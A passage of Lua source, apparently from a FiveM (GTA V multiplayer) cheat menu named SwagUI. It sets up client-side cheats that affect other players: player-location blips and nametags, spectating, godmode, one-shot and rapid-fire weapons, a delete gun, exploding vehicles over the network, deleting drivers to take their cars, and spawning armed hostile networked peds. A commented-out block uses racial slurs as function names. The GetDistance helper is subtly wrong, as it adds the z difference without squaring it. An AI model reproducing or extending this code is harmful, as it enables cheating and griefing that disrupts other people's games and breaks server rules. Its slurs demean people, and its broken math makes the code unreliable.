	  if IsVehicleSeatFree(NearestVehicle, -1) then
		SetPedIntoVehicle(playerPed, NearestVehicle, -1)
		SetVehicleAlarm(NearestVehicle, false)
		SetVehicleDoorsLocked(NearestVehicle, 1)
		SetVehicleNeedsToBeHotwired(NearestVehicle, false)
	  else
		local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
		ClearPedTasksImmediately(driverPed)
		SetEntityAsMissionEntity(driverPed, 1, 1)
		DeleteEntity(driverPed)
		SetPedIntoVehicle(playerPed, NearestVehicle, -1)
		SetVehicleAlarm(NearestVehicle, false)
		SetVehicleDoorsLocked(NearestVehicle, 1)
		SetVehicleNeedsToBeHotwired(NearestVehicle, false)
	  end
	  SwagUI.SendNotification({text = "~g~Teleported To Nearest Vehicle", type = "error"})
	elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
	  if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
		if IsVehicleSeatFree(NearestVehicle, -1) then
		  SetPedIntoVehicle(playerPed, NearestVehicle, -1)
		  SetVehicleAlarm(NearestVehicle, false)
		  SetVehicleDoorsLocked(NearestVehicle, 1)
		  SetVehicleNeedsToBeHotwired(NearestVehicle, false)
		else
		  local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
		  ClearPedTasksImmediately(driverPed)
		  SetEntityAsMissionEntity(driverPed, 1, 1)
		  DeleteEntity(driverPed)
		  SetPedIntoVehicle(playerPed, NearestVehicle, -1)
		  SetVehicleAlarm(NearestVehicle, false)
		  SetVehicleDoorsLocked(NearestVehicle, 1)
		  SetVehicleNeedsToBeHotwired(NearestVehicle, false)
		end
	  elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
		if IsVehicleSeatFree(NearestPlane, -1) then
		  SetPedIntoVehicle(playerPed, NearestPlane, -1)
		  SetVehicleAlarm(NearestPlane, false)
		  SetVehicleDoorsLocked(NearestPlane, 1)
		  SetVehicleNeedsToBeHotwired(NearestPlane, false)
		else
		  local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
		  ClearPedTasksImmediately(driverPed)
		  SetEntityAsMissionEntity(driverPed, 1, 1)
		  DeleteEntity(driverPed)
		  SetPedIntoVehicle(playerPed, NearestPlane, -1)
		  SetVehicleAlarm(NearestPlane, false)
		  SetVehicleDoorsLocked(NearestPlane, 1)
		  SetVehicleNeedsToBeHotwired(NearestPlane, false)
		end
	  end
	  SwagUI.SendNotification({text = "~g~Teleported To Nearest Vehicle", type = "error"})
	end
end

local function SpectatePlayer(selectedPlayer)
	local selectedPlayerPed = GetPlayerPed(selectedPlayer)
	
	if Swag.Player.Spectating then

		RequestCollisionAtCoord(GetEntityCoords(PlayerPedId()))

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		NetworkSetInSpectatorMode(false, 0)
		SetMinimapInSpectatorMode(false, 0)

		--ClearPedTasks(PlayerPedId())
		DoScreenFadeIn(500)

	else

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		RequestCollisionAtCoord(GetEntityCoords(selectedPlayerPed))

		NetworkSetInSpectatorMode(false, 0)
		NetworkSetInSpectatorMode(true, selectedPlayerPed)
		SetMinimapInSpectatorMode(true, selectedPlayerPed)

		--TaskWanderStandard(PlayerPedId(), 0, 0)
		DoScreenFadeIn(500)
		
	end

	Swag.Player.Spectating = not Swag.Player.Spectating
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

local function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			break
		end
	end
end

local ptags = {}
-- Thread that handles all menu toggles (Godmode, ESP, etc)
--[[
isAttached = false
attachedEntity = nil

local fuckingchickenwings = nil

function roll_the_nigger_up_in_a_ball_666()
    while IsPedInAnyVehicle(GetPlayerPed(-1), false) do
		local heading = GetEntityHeading(GetPlayerPed(-1))
		local rheading = GetEntityRotation(GetPlayerPed(-1), 2)
        --SetEntityHeading(fuckingchickenwings, heading)
		SetEntityNoCollisionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), fuckingchickenwings, true)
		--AttachEntityToEntity(fuckingchickenwings, GetPlayerPed(-1), 0, 0, -1.0, 0.0, 0.0, 180, true, true, false, true, 1, true)
		AttachEntityToEntity(fuckingchickenwings, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), SKEL_Spine_Root), 0.0, 0.0, 0.0, 0.0, 0.0, 180, false, false, false, false, 2, false)
		SetEntityRotation(GetPlayerPed(-1), 0, 0, math.random() % 360, 2, true)
        Citizen.Wait(0)
    end
	if fuckingchickenwings ~= nil then
	DeleteEntity(fuckingchickenwings)
	end
end

function shootfuckingstupidniggers()
	if fuckingchickenwings ~= nil then
	DeleteEntity(fuckingchickenwings)
	end
    CreateThread(roll_the_nigger_up_in_a_ball_666)
    if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
        SetEntityVisible(GetVehiclePedIsIn(GetPlayerPed(-1), false), false, false)
        SetEntityVisible(GetPlayerPed(-1), true, false)
        
        local rollerhash = GetHashKey(ComboOptions.fcars.Values[ComboOptions.fcars.Selected])
        local roller = CreateObject(rollerhash, 0, 0, 0, true, true, true)
        fuckingchickenwings = roller
    end
end
]]--
function RotToDirection(rot)
    local radiansZ = math.rad(rot.z)
    local radiansX = math.rad(rot.x)
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function GetDistance(pointA, pointB)

    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2

    return math.sqrt(sum2 + zBA)
end

function add(a, b)
    local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return result
end

function rotDirection(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end

function multiply(coords, coordz)
    local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return result
end

bg_ped_list = {}

Citizen.CreateThread(function()
	while isMenuEnabled do
		for i,ped in ipairs(bg_ped_list) do
			if IsEntityDead(ped) then
				table.remove(bg_ped_list, i)
			else
				local coords = GetEntityCoords(GetPlayerPed(-1), true)
				local ped_coords = GetEntityCoords(ped, true)
				if GetDistanceBetweenCoords(coords, ped_coords) >= 4.0 then
					RequestControlOnce(ped)
					TaskGoToCoordAnyMeans(ped, coords, 150.0, 0, 0, 786603, 0xbf800000)
				end
			end
		end
		Citizen.Wait(3000)
	end
end)
Crosshair = true	
showMinimap = true
local function MenuToggleThread()
	while isMenuEnabled do

		-- Radar/showMinimap
		DisplayRadar(showMinimap, 1)
		
		Swag.Player.IsInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)

		SetPlayerInvincible(PlayerId(), God_mode)
		SetEntityInvincible(PlayerPedId(), God_mode)

		SetPedCanBeKnockedOffVehicle(PlayerPedId(), Swag.Toggle.VehicleNoFall) 

		SetEntityVisible(PlayerPedId(), not invisable1, 0)

		SetPedCanRagdoll(PlayerPedId(), not RagdollToggle)

		if Crosshair then
			EnableCrosshairThisFrame()
			ShowHudComponentThisFrame(14)
		end
		
		if thirdperson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
		end
		
		if playerBlips then
			-- show blips
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				if ped ~= PlayerPedId() then
					local blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					-- headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )

					-- Speaking display
					-- I need to move this over to name tag code
					-- if NetworkIsPlayerTalking(id) then
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
					-- else
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
					-- end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
					else -- update blip
						local veh = GetVehiclePedIsIn(ped, false)
						local blipSprite = GetBlipSprite(blip)

						if GetEntityHealth(ped) == 0 then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
							end
						elseif veh then
							local vehClass = GetVehicleClass(veh)
							local vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							local passengers = GetVehicleNumberOfPassengers(veh)

							if passengers > 0 then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)

							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator

							end
						end

						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		elseif not playerBlips then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				local blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
			end
		
		end

		SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), SliderOptions.DamageModifier.Values[SliderOptions.DamageModifier.Selected])

		if Swag.Toggle.DBull then
            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                Swag.Toggle.DBull = not Swag.Toggle.DBull
            elseif IsDisabledControlJustPressed(0, 86) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                local coords = GetEntityCoords(veh)
                local forward = GetEntityForwardVector(veh)
                local heading = GetEntityHeading(veh)
                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                SetVehicleColours(veh, 27, 27)
                SetVehicleEngineHealth(veh, -3500.0)
                ApplyForce(veh, forward * 500.0)
            end
        end

		if Swag.Toggle.VehicleCollision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end

		if Swag.Toggle.TireSmoke then
			if Swag.Player.Vehicle ~= 0 then
				RequestNamedPtfxAsset("scr_recartheft")
			while not HasNamedPtfxAssetLoaded("scr_recartheft") do
				Wait(1)
			end
			RequestNamedPtfxAsset("core")
			while not HasNamedPtfxAssetLoaded("core") do
				Wait(1)
			end
			ang,speed = vehicleAngle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
			local _SIZE = 0.25
			local _DENS = 25
			local _BURNOUT_SIZE = 1.5
			if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                if speed >= 1.0 and ang ~= 0 then
                    driftSmoke("scr_recartheft","scr_wheel_burnout", GetVehiclePedIsUsing(GetPlayerPed(-1)), _DENS, _SIZE)
                elseif --[[speed < 1.0 and]] IsVehicleInBurnout(GetVehiclePedIsUsing(GetPlayerPed(-1))) then
                    driftSmoke("core" ,"exp_grd_bzgas_smoke", GetVehiclePedIsUsing(GetPlayerPed(-1)), 3, _BURNOUT_SIZE)
                end
            end
			end
		else
			if Swag.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(Swag.Player.Vehicle, 9.8)
			end
		end
		
		if Swag.Toggle.Waterp then
			if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
				SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
			end
		end
		
		if Swag.Toggle.EasyHandling then
			if Swag.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(Swag.Player.Vehicle, 30.0)
			end
		else
			if Swag.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(Swag.Player.Vehicle, 9.8)
			end
		end
		
		if Swag.Toggle.CWallride then
			if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
				ApplyForceToEntity(GetVehiclePedIsIn(PlayerPedId(), true), 1, 0, 0, -0.4, 0, 0, 0, 1, true, true, true, true, true)
			end
		else
			if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
				ApplyForceToEntity(GetVehiclePedIsIn(PlayerPedId(), true), 1, 0, 0, 0, 0, 0, 0, 1, true, true, true, true, true)
			end
		end
		
		local function DrawTxt(text, x, y)
			SetTextFont(4)
			SetTextColour(255,255,255,255)
			SetTextProportional(1)
			SetTextCentre(true)
			SetTextScale(0.0, 0.6)
			SetTextDropshadow(1, 0, 0, 0, 255)
			SetTextEdge(1, 0, 0, 0, 255)
			SetTextDropShadow()
			SetTextOutline()
			SetTextEntry("STRING")
			AddTextComponentString(text)
			DrawText(x, y)
		end
		
		if esp_Coords then
			x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
			roundx = tonumber(string.format("%.2f", x))
			roundy = tonumber(string.format("%.2f", y))
			roundz = tonumber(string.format("%.2f", z))
			DrawTxt("X: " .. roundx .. "\tY: " .. roundy .. "\tZ: " .. roundz, 0.5, 0)
		end

		if showNametags then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					local ped = GetPlayerPed( id )
					--blip = GetBlipFromEntity( ped )

					local x1, y1, z1 = table.unpack( GetEntityCoords(PlayerPedId(), true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
						if NetworkIsPlayerTalking(id) then
							DrawText3D(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 30, 144, 255)
						else
							DrawText3D(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 255, 255, 255)
						end
					end
				end
			end
		end
		
		if showGoodNametags then
			tags_plist = GetActivePlayers()
			for i = 1, #tags_plist do
				ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
				SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
				SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
			end

            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
		elseif not showNametags then
			-- for i = 1, #ptags do
			-- 	SetMpGamerTagVisibility(ptags[i], 4, 0)
			-- 	SetMpGamerTagVisibility(ptags[i], 8, 0)
			-- end
		end
		

		if SuperJump then
			SetSuperJumpThisFrame(PlayerId())
		end

		if InfStamina then
			RestorePlayerStamina(PlayerId(), 1.0)
		end

		if LaunchGun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
		
		local ped_list = {
			"a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01",
			"s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", 
			"u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", 
			"s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03",
			"s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01",
			"csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01",
			"cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", 
			"mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04",
			"a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01",
			"a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01",
			"a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", 
			"a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", 
			"a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler",
			"a_c_sharktiger", "a_c_shepherd", "a_c_westy",
		}
		
		-- POK-E-BALL
		if PokiBall then
			local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
			if ret then
				local rand = math.ceil(math.random(#ped_list))
				local model = GetHashKey(ped_list[rand])
				RequestModel(model)
				while not HasModelLoaded(model) do
					Citizen.Wait(0)
				end
				local ped = CreatePed(26, model, pos.x, pos.y, pos.z, heading, true, true)
				NetworkRegisterEntityAsNetworked(ped)
				
				local netped = PedToNet(ped)
				NetworkSetNetworkIdDynamic(netped, false)
				SetNetworkIdCanMigrate(netped, true)
				SetNetworkIdExistsOnAllMachines(netped, true)
				GiveWeaponToPed(ped, GetHashKey("WEAPON_ASSAULTRIFLE"), 9999, 1, 1)
				SetPedCanSwitchWeapon(ped, true)
					
				TaskCombatHatedTargetsInArea(ped, pos.x, pos.y, pos.z, 500)
			end
		end
		
		if Fped then
			local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
			if ret then
				local rand = math.ceil(math.random(#ped_list))
				local model = GetHashKey(ped_list[rand])
				RequestModel(model)
				while not HasModelLoaded(model) do
					Citizen.Wait(0)
				end
				local ped = CreatePed(26, model, pos.x, pos.y, pos.z, heading, true, true)
				NetworkRegisterEntityAsNetworked(ped)
				
				local netped = PedToNet(ped)
				NetworkSetNetworkIdDynamic(netped, false)
				SetNetworkIdCanMigrate(netped, true)
				SetNetworkIdExistsOnAllMachines(netped, true)
				GiveWeaponToPed(ped, GetHashKey("WEAPON_ASSAULTRIFLE"), 9999, 1, 1)
				SetPedCanSwitchWeapon(ped, true)
				
				AddRelationshipGroup("pl_body_guard")

				SetPedRelationshipGroupHash(GetPlayerPed(-1), GetHashKey("pl_body_guard"))
				SetPedRelationshipGroupHash(ped, GetHashKey("pl_body_guard"))
				--TaskGoToCoordAnyMeans(ped, coords, 150.0, 0, 0, 786603, 0xbf800000)
				--TaskGoToEntity(ped, GetPlayerPed(-1), -1, 9999, 100, 1073741824, 0)
				table.insert(bg_ped_list, ped)
			end
		end
		
		if pedGun then
			local heading = GetEntityHeading(PlayerPedId())
			local rot = GetGameplayCamRot(0)
			local dir = RotToDirection(rot)
			local camPosition = GetGameplayCamCoord()
			local playerPosition = GetEntityCoords(PlayerPedId(), true)
			local spawnDistance = GetDistance(camPosition, playerPosition)
			spawnDistance = spawnDistance + 5
			local spawnPosition = add(camPosition, multiply(dir, spawnDistance))
			local rand = math.ceil(math.random(#ped_list))
			local model = GetHashKey(ped_list[rand])

			RequestModel(model)
			while not HasModelLoaded(model) do
				Citizen.Wait(0)
			end

			if HasModelLoaded(model) then
				if IsPedShooting(PlayerPedId()) then
					local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
					SetEntityRecordsCollisions(spawnedPed, true)
					for f = 0.0, 75.0 do
						if HasEntityCollidedWithAnything(spawnedPed) then break end
							ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
					end
				end
			end
		end

		if TeleportGun then
			local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
			if impact then
				SetEntityCoords(PlayerPedId(), coords.x, coords.y, coords.z + 3)
			end
		end


		if VehicleGun then
			local VehicleGunVehicle = "Freight"
			local playerPedPos = GetEntityCoords(PlayerPedId(), true)
			if (IsPedInAnyVehicle(PlayerPedId(), true) == false) then
				GiveWeaponToPed(PlayerPedId(), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
				SetPedAmmo(PlayerPedId(), GetHashKey("WEAPON_APPISTOL"), 999999)
				if (GetSelectedPedWeapon(PlayerPedId()) == GetHashKey("WEAPON_APPISTOL")) then
					if IsPedShooting(PlayerPedId()) then
						while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(VehicleGunVehicle))
						end
						local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(PlayerPedId())), playerPedPos.y + (5 * GetEntityForwardY(PlayerPedId())), playerPedPos.z + 2.0, GetEntityHeading(PlayerPedId()), true, true)
						SetEntityAsNoLongerNeeded(veh)
						SetVehicleForwardSpeed(veh, 150.0)
					end
				end
			end
		end

		if OneShot then
			SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
		else
			SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
		end
		
		
		
		if OneShotCar then
			if IsControlJustReleased(1, 142) then
				NetworkExplodeVehicle(GetVehiclePedIsIn(getEntityInCrosshair(PlayerId(-1)), true), true, true, 0)
			end
		end

		if Swag.Toggle.DeleteGun then
			local found, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
			if found then
				local entityCoords = GetEntityCoords(entity)
				DrawMarker(2, entityCoords.x, entityCoords.y, entityCoords.z + 2, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 2.0, 2.0, 2.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 170, false, true, 2, nil, nil, false)
				if IsDisabledControlPressed(0, Swag.Keys["MOUSE1"]) then
					SetEntityAsMissionEntity(entity)
					DeleteEntity(entity)
				end
			end
		end

		if Swag.Toggle.RapidFire then
			DisablePlayerFiring(PlayerPedId(), true)
			if IsDisabledControlPressed(0, Swag.Keys["MOUSE1"]) then
				local _, weapon = GetCurrentPedWeapon(PlayerPedId())
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local camDir = GetCamDirFromScreenCenter()
				local camPos = GetGameplayCamCoord()
				local launchPos = GetEntityCoords(wepent)
				local targetPos = camPos + (camDir * 200.0)
				
				ClearAreaOfProjectiles(launchPos, 0.0, 1)
				
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
			end
		end
		
